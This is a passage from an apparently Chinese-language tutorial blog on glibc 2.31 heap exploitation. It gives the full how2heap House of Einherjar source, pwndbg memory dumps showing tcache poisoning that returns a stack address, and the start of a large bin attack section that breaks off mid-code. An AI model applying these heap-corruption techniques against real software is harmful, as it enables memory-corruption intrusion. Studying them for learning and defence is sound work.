chunk c，由于 chunk c 的 prev_inused 为0，则认为前面的 chunk 是free 的此时会有一个向前合并的过程,这样我们就会有两个指针指向 fake chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p c</span><br><span class="line">$<span class="number">18</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x555555559310</span> <span class="string">&quot;&quot;</span></span><br><span class="line">pwndbg&gt; telescope <span class="number">0x5555555592a0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi  <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x5555555592a8</span> ◂— <span class="number">0x161</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x5555555592b0</span> —▸ <span class="number">0x7ffff7fb0be0</span> (main_arena+<span class="number">96</span>) —▸ <span class="number">0x555555559b00</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x5555555592c0</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x5555555592d8</span> ◂— <span class="number">0x31</span> <span class="comment">/* &#x27;1&#x27; */</span></span><br><span class="line">pwndbg&gt; p a</span><br><span class="line">$<span class="number">19</span> = (<span class="keyword">intptr_t</span> *) <span class="number">0x5555555592a0</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure><p>然后我们此时再 malloc 一个 0x158 大小的chunk ，合并后大小为 0x160, 然后此时 合并后的 chunk 就会被整块取出,  </p><p>然后我们在进行如下操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">119</span>     <span class="keyword">uint8_t</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="number">120</span>     <span class="built_in">free</span>(pad);</span><br><span class="line">  <span class="number">121</span></span><br><span class="line">► <span class="number">122</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line">  <span class="number">123</span>     <span class="built_in">free</span>(b);</span><br></pre></td></tr></table></figure><p>那么此时  chunk b 也会加入到  tcache bin里，且指向了刚 free 的 pad chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p b</span><br><span class="line">$<span class="number">25</span> = (<span class="keyword">uint8_t</span> *) <span class="number">0x5555555592e0</span> <span class="string">&quot;\020\233UUUU&quot;</span></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line"><span class="number">0x30</span> [  <span class="number">2</span>]: <span class="number">0x5555555592e0</span> —▸ <span class="number">0x555555559b10</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0x100</span> [  <span class="number">7</span>]: <span class="number">0x555555559a10</span> —▸ <span class="number">0x555555559910</span> —▸ <span class="number">0x555555559810</span> —▸ <span class="number">0x555555559710</span> —▸ <span class="number">0x555555559610</span> —▸ <span class="number">0x555555559510</span> —▸ <span class="number">0x555555559410</span> ◂— <span class="number">0x0</span></span><br><span class="line">fastbins</span><br></pre></td></tr></table></figure><p>由于， chunk d 可对 chunkb进行任意修改 （堆块重叠了）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x5555555592b0</span><span class="number">-0x10</span></span><br><span class="line"><span class="number">0x5555555592a0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000161</span>      =====&gt; chunk d</span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span>      =====&gt; fake chunk <span class="keyword">and</span> chunk b</span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x0000555555559b10</span><span class="number">0x0000555555559010</span>         ----&gt; chunk b fd -&gt; <span class="number">0x0000555555559b10</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000060</span><span class="number">0x0000000000000100</span>      =====&gt; chunk c</span><br><span class="line"><span class="number">0x555555559310</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559320</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559330</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559340</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>我们通过修改 chunk d 的内容来达到 修改 chunk b 的 fd 指针的目的，</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">In file: /media/psf/Home/Downloads/how2heap/glibc_2<span class="number">.31</span>/house_of_einherjar.c</span><br><span class="line">   <span class="number">125</span></span><br><span class="line">   <span class="number">126</span>     <span class="built_in">printf</span>(<span class="string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);</span><br><span class="line">   <span class="number">127</span>     d[<span class="number">0x30</span> / <span class="number">8</span>] = (<span class="keyword">long</span>) stack_var;</span><br><span class="line">   <span class="number">128</span></span><br><span class="line">   <span class="number">129</span>     <span class="comment">// take target out</span></span><br><span class="line"> ► <span class="number">130</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">   <span class="number">131</span>     <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">   <span class="number">132</span>     <span class="keyword">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">   <span class="number">133</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br><span class="line">   <span class="number">134</span></span><br><span class="line">   <span class="number">135</span>     <span class="comment">// sanity check</span></span><br><span class="line">─────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffe210</span> ◂— <span class="number">0x700000000</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffe218</span> ◂— <span class="number">0x2800000007</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffe220</span> —▸ <span class="number">0x5555555592a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffe228</span> —▸ <span class="number">0x5555555592e0</span> —▸ <span class="number">0x7fffffffe260</span> —▸ <span class="number">0x555555554040</span> ◂— <span class="number">0x400000006</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffe230</span> —▸ <span class="number">0x555555559310</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffe238</span> —▸ <span class="number">0x555555559308</span> ◂— <span class="number">0x100</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffe240</span> ◂— <span class="number">0x60</span> <span class="comment">/* &#x27;`&#x27; */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffe248</span> —▸ <span class="number">0x5555555592b0</span> ◂— <span class="number">0x0</span></span><br><span class="line">───────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">55555555571</span>e main+<span class="number">1269</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7dec0b3 __libc_start_main+<span class="number">243</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x5555555592b0</span></span><br><span class="line"><span class="number">0x5555555592b0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592c0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x5555555592d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000031</span></span><br><span class="line"><span class="number">0x5555555592e0</span>:<span class="number">0x00007fffffffe260</span><span class="number">0x0000555555559010</span></span><br><span class="line"><span class="number">0x5555555592f0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555559300</span>:<span class="number">0x0000000000000060</span><span class="number">0x0000000000000100</span></span><br></pre></td></tr></table></figure><p>最后我们只需两次 malloc 就能拿到目标地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">  <span class="number">129</span>     <span class="comment">// take target out</span></span><br><span class="line">  <span class="number">130</span>     <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">► <span class="number">131</span>     <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="number">132</span>     <span class="keyword">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">  <span class="number">133</span>     <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br></pre></td></tr></table></figure><p>完整代码如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;malloc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This modification to The House of Enherjar works with the tcache-option enabled on glibc-2.31.</span></span><br><span class="line"><span class="comment">     * The House of Einherjar uses an off-by-one overflow with a null byte to control the pointers returned by malloc().</span></span><br><span class="line"><span class="comment">     * It has the additional requirement of a heap leak. </span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * After filling the tcache list to bypass the restriction of consolidating with a fake chunk,</span></span><br><span class="line"><span class="comment">     * we target the unsorted bin (instead of the small bin) by creating the fake chunk in the heap.</span></span><br><span class="line"><span class="comment">     * The following restriction for normal bins won&#x27;t allow us to create chunks bigger than the memory</span></span><br><span class="line"><span class="comment">     * allocated from the system in this arena:</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * https://sourceware.org/git/?p=glibc.git;a=commit;f=malloc/malloc.c;h=b90ddd08f6dd688e651df9ee89ca3a69ff88cd0c */</span></span><br><span class="line"></span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Welcome to House of Einherjar 2!\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Tested on Ubuntu 20.04 64bit (glibc-2.31).\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This technique can be used when you have an off-by-one into a malloc&#x27;ed region with a null byte.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This file demonstrates a tcache poisoning attack by tricking malloc into\n&quot;</span></span><br><span class="line">           <span class="string">&quot;returning a pointer to an arbitrary location (in this case, the stack).\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// prepare the target</span></span><br><span class="line">    <span class="keyword">intptr_t</span> stack_var[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nThe address we want malloc() to return is %p.\n&quot;</span>, (<span class="keyword">char</span> *) &amp;stack_var);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x38 bytes for &#x27;a&#x27; and use it to create a fake chunk\n&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *a = <span class="built_in">malloc</span>(<span class="number">0x38</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// create a fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe create a fake chunk preferably before the chunk(s) we want to overlap, and we must know its address.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We set our fwd and bck pointers to point at the fake_chunk in order to pass the unlink checks\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    a[<span class="number">0</span>] = <span class="number">0</span>;    <span class="comment">// prev_size (Not Used)</span></span><br><span class="line">    a[<span class="number">1</span>] = <span class="number">0x60</span>; <span class="comment">// size</span></span><br><span class="line">    a[<span class="number">2</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// fwd</span></span><br><span class="line">    a[<span class="number">3</span>] = (<span class="keyword">size_t</span>) a; <span class="comment">// bck</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk at %p looks like:\n&quot;</span>, a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;prev_size (not used): %#lx\n&quot;</span>, a[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;size: %#lx\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fwd: %#lx\n&quot;</span>, a[<span class="number">2</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;bck: %#lx\n&quot;</span>, a[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0x28 bytes for &#x27;b&#x27;.\n&quot;</span></span><br><span class="line">           <span class="string">&quot;This chunk will be used to overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span></span><br><span class="line">           <span class="string">&quot;After this chunk is overlapped, it can be freed and used to launch a tcache poisoning attack.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *b = (<span class="keyword">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;b: %p\n&quot;</span>, b);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> real_b_size = malloc_usable_size(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Since we want to overflow &#x27;b&#x27;, we need the &#x27;real&#x27; size of &#x27;b&#x27; after rounding: %#x\n&quot;</span>, real_b_size);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In this case it is easier if the chunk size attribute has a least significant byte with</span></span><br><span class="line"><span class="comment">     * a value of 0x00. The least significant byte of this will be 0x00, because the size of </span></span><br><span class="line"><span class="comment">     * the chunk includes the amount requested plus some amount required for the metadata. */</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe allocate 0xf8 bytes for &#x27;c&#x27;.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *c = (<span class="keyword">uint8_t</span> *) <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c: %p\n&quot;</span>, c);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint64_t</span>* c_size_ptr = (<span class="keyword">uint64_t</span>*)(c - <span class="number">8</span>);</span><br><span class="line">    <span class="comment">// This technique works by overwriting the size metadata of an allocated chunk as well as the prev_inuse bit</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nc.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c.size is: (0x100) | prev_inuse = 0x101\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overflow &#x27;b&#x27; with a single null byte into the metadata of &#x27;c&#x27;\n&quot;</span>);</span><br><span class="line">    b[real_b_size] = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;c.size: %#lx\n&quot;</span>, *c_size_ptr);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;It is easier if b.size is a multiple of 0x100 so you &quot;</span></span><br><span class="line">           <span class="string">&quot;don&#x27;t change the size of b, only its prev_inuse bit\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Write a fake prev_size to the end of b</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nWe write a fake prev_size to the last %lu bytes of &#x27;b&#x27; so that &quot;</span></span><br><span class="line">           <span class="string">&quot;it will consolidate with our fake chunk\n&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>));</span><br><span class="line">    <span class="keyword">size_t</span> fake_size = (<span class="keyword">size_t</span>)((c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>) - (<span class="keyword">uint8_t</span>*) a);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake prev_size will be %p - %p = %#lx\n&quot;</span>, c - <span class="keyword">sizeof</span>(<span class="keyword">size_t</span>) * <span class="number">2</span>, a, fake_size);</span><br><span class="line">    *(<span class="keyword">size_t</span>*) &amp;b[real_b_size-<span class="keyword">sizeof</span>(<span class="keyword">size_t</span>)] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Change the fake chunk&#x27;s size to reflect c&#x27;s new prev_size</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nMake sure that our fake chunk&#x27;s size is equal to c&#x27;s new prev_size.\n&quot;</span>);</span><br><span class="line">    a[<span class="number">1</span>] = fake_size;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (b.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Now we fill the tcache before we free chunk &#x27;c&#x27; to consolidate with our fake chunk</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nFill tcache.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *x[<span class="number">7</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++) &#123;</span><br><span class="line">        x[i] = <span class="built_in">malloc</span>(<span class="number">0xf8</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Fill up tcache list.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="keyword">sizeof</span>(x)/<span class="keyword">sizeof</span>(<span class="keyword">intptr_t</span>*); i++) &#123;</span><br><span class="line">        <span class="built_in">free</span>(x[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we free &#x27;c&#x27; and this will consolidate with our fake chunk since &#x27;c&#x27; prev_inuse is not set\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Our fake chunk size is now %#lx (c.size + fake_prev_size)\n&quot;</span>, a[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nNow we can call malloc() and it will begin in our fake chunk\n&quot;</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *d = <span class="built_in">malloc</span>(<span class="number">0x158</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Next malloc(0x158) is at %p\n&quot;</span>, d);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// tcache poisoning</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;After the patch https://sourceware.org/git/?p=glibc.git;a=commit;h=77dc0d8643aa99c92bf671352b0a8adde705896f,\n&quot;</span></span><br><span class="line">           <span class="string">&quot;We have to create and free one more chunk for padding before fd pointer hijacking.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">uint8_t</span> *pad = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">free</span>(pad);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nNow we free chunk &#x27;b&#x27; to launch a tcache poisoning attack\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(b);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now the tcache list has [ %p -&gt; %p ].\n&quot;</span>, b, pad);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;We overwrite b&#x27;s fwd pointer using chunk &#x27;d&#x27;\n&quot;</span>);</span><br><span class="line">    d[<span class="number">0x30</span> / <span class="number">8</span>] = (<span class="keyword">long</span>) stack_var;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// take target out</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now we can cash out the target chunk.\n&quot;</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">intptr_t</span> *e = <span class="built_in">malloc</span>(<span class="number">0x28</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\nThe new chunk is at %p\n&quot;</span>, e);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(e == stack_var);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Got control on target/stack!\n\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="5-large-bin-attack"><a href="#5-large-bin-attack" class="headerlink" title="5. large_bin_attack"></a>5. large_bin_attack</h3><p>通过该技术向目标地址写入一个大值</p><p>2.30 之后关于 largs bin 的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (size) &lt; (<span class="keyword">unsigned</span> <span class="keyword">long</span>) chunksize_nomask (bck-&gt;bk))&#123;</span><br><span class="line">fwd = bck;</span><br><span class="line">bck = bck-&gt;bk;</span><br><span class="line">victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里加了两个检查</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted </span></span><br><span class="line"><span class="string">(nextsize)&quot;</span>);</span><br></pre></td></tr></table></figure><p>以及</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (bck-&gt;fd != fwd)</span><br><span class="line">malloc_printerr (<span class="string">&quot;malloc(): largebin double linked list corrupted 